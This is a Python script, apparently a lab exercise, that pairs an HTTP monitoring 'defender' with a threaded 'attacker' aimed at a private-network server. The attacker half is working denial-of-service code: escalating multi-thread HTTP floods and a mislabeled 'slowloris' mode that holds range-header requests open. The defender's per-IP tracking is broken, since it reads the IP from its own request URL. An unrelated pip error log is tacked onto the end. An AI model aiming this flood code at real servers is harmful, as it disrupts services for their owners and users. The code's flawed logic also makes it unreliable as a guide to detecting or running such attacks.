
# defender_http.py
import requests
import threading
import time
import logging
from collections import defaultdict, deque
import psutil
import sys
from rich.console import Console
from rich.live import Live
from rich.table import Table
from dataclasses import dataclass

console = Console()
@dataclass
class ConnectionMetrics:
    ip: str
    requests_per_second: float
    response_time: float
    total_requests: int
    status: str
class HTTPDefender:
    def __init__(self, target="http://172.16.128.216:8080"):
        self.target = target
        self.running = True
        self.connections = defaultdict(lambda: deque(maxlen=1000))
        self.metrics = defaultdict(lambda: ConnectionMetrics('', 0, 0, 0, 'ACTIVE'))
        
        # Configuration
        self.config = {
            'REQUEST_THRESHOLD': 50,    # Requests per second
            'MONITOR_WINDOW': 5,        # Monitoring window in seconds
            'CHECK_INTERVAL': 0.5       # How often to check server (seconds)
        }
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[logging.FileHandler('defender.log'), logging.StreamHandler()]
        )
        self.dynamic_threshold = 50  # Initial threshold
        self.ip_request_counts = defaultdict(lambda: deque(maxlen=100))  # Store timestamps of requests per IP
    def monitor_server(self):
        """Monitor HTTP server status"""
        console.print(f"[green]Starting defender monitoring {self.target}[/green]")
        
        def generate_table() -> Table:
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Time")
            table.add_column("Status")
            table.add_column("Response Time")
            table.add_column("Requests/sec")
            
            try:
                start_time = time.time()
                response = requests.get(self.target, timeout=2)
                response_time = time.time() - start_time
                
                # Track request by IP (assuming the server logs IPs)
                ip = response.url.split('/')[2]  # Extract IP from the URL (for demonstration)
                print(ip)
                self.ip_request_counts[ip].append(time.time())
                
                # Calculate requests per second for this IP
                current_requests = len([t for t in self.ip_request_counts[ip] 
                                        if t > time.time() - self.config['MONITOR_WINDOW']])
                print(current_requests)
                requests_per_sec = current_requests / self.config['MONITOR_WINDOW']
                print(requests_per_sec)
                # Adjust dynamic threshold based on request rate
                if requests_per_sec > self.dynamic_threshold:
                    console.print(f"[red]Alert: High request rate detected from {ip} - {requests_per_sec:.2f} req/sec[/red]")
                    self.dynamic_threshold = min(self.dynamic_threshold + 10, 100)  # Increase threshold
                else:
                    self.dynamic_threshold = max(self.dynamic_threshold - 1, 50)  # Decrease threshold if stable
                
                status = "[green]OK" if response.status_code == 200 else "[red]ERROR"
                
                table.add_row(
                    time.strftime("%H:%M:%S"),
                    status,
                    f"{response_time:.3f}s",
                    f"{requests_per_sec:.2f}"
                )
                
                # Track request
                self.connections['total'].append(time.time())
                
            except requests.exceptions.RequestException:
                table.add_row(
                    time.strftime("%H:%M:%S"),
                    "[red]DOWN",
                    "-",
                    "-"
                )
            
            return table
        with Live(generate_table(), refresh_per_second=2) as live:
            while self.running:
                live.update(generate_table())
                time.sleep(self.config['CHECK_INTERVAL'])
    def start(self):
        """Start the defender"""
        try:
            self.monitor_server()
        except KeyboardInterrupt:
            self.running = False
            console.print("\n[yellow]Defender stopped[/yellow]")
# attacker_http.py
class HTTPAttacker:
    def __init__(self, target="http://172.16.128.216:8080"):
        self.target = target
        self.running = True
        self.attack_threads = []
        self.session = requests.Session()
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[logging.FileHandler('attacker.log'), logging.StreamHandler()]
        )
    def attack_thread(self, attack_type: str, rate: int):
        """Execute attack"""
        while self.running:
            try:
                if attack_type == "flood":
                    # Basic HTTP flood to a valid endpoint
                    response = self.session.get(
                        f"{self.target}/about",  # Changed to a valid endpoint
                        timeout=1
                    )
                    console.print(f"[cyan]Attack sent - Status: {response.status_code}[/cyan]")
                    time.sleep(1/rate)
                    
                elif attack_type == "slowloris":
                    # Slow HTTP attack
                    headers = {'Range': 'bytes=0-,5-0,5-1,5-2,5-3'}
                    response = self.session.get(
                        self.target,
                        headers=headers,
                        stream=True,
                        timeout=5
                    )
                    console.print("[cyan]Slow request sent[/cyan]")
                    time.sleep(100)  # Keep connection open
                    
            except requests.exceptions.RequestException as e:
                console.print(f"[red]Attack failed: {str(e)}[/red]")
                time.sleep(1)
    def start_attack(self, attack_type="flood", threads=20, rate=10):
        """Start DDoS attack"""
        console.print(f"\n[red]Starting {attack_type} attack with {threads} threads[/red]")
        console.print(f"Target: {self.target}")
        console.print(f"Rate: {rate} requests/second per thread")
        
        self.running = True
        
        for i in range(threads):
            thread = threading.Thread(
                target=self.attack_thread,
                args=(attack_type, rate)
            )
            thread.daemon = True
            self.attack_threads.append(thread)
            thread.start()
            time.sleep(0.1)  # Stagger thread starts
    def stop_attack(self):
        """Stop the attack"""
        self.running = False
        for thread in self.attack_threads:
            thread.join()
        console.print("[yellow]Attack stopped[/yellow]")
def main():
    if len(sys.argv) != 2:
        print("Usage: python script.py [defender|attacker]")
        sys.exit(1)
    mode = sys.argv[1].lower()
    
    if mode == "defender":
        defender = HTTPDefender()
        try:
            defender.start()
        except KeyboardInterrupt:
            defender.running = False
            
    elif mode == "attacker":
        attacker = HTTPAttacker()
        try:
            # Progressive attack sequence
            console.print("[yellow]Starting attack sequence...[/yellow]")
            
            # Low intensity flood
            attacker.start_attack("flood", threads=3, rate=5)
            time.sleep(10)
            
            # Medium intensity flood
            attacker.start_attack("flood", threads=5, rate=10)
            time.sleep(10)
            
            # High intensity flood
            attacker.start_attack("flood", threads=10, rate=20)
            time.sleep(10)
            
            # Slowloris attack
            attacker.start_attack("slowloris", threads=5, rate=1)
            time.sleep(10)
            
        except KeyboardInterrupt:
            console.print("\n[yellow]Attack interrupted[/yellow]")
        finally:
            attacker.stop_attack()
            
    else:
        print("Invalid mode. Use 'defender' or 'attacker'")
if __name__ == "__main__":
    main()
    
    
# Example usage
log_messages = [
    "Requirement already satisfied: pip",
    "ERROR: Could not find a version that satisfies the requirement install",
    "ERROR: No matching distribution found for install"
]
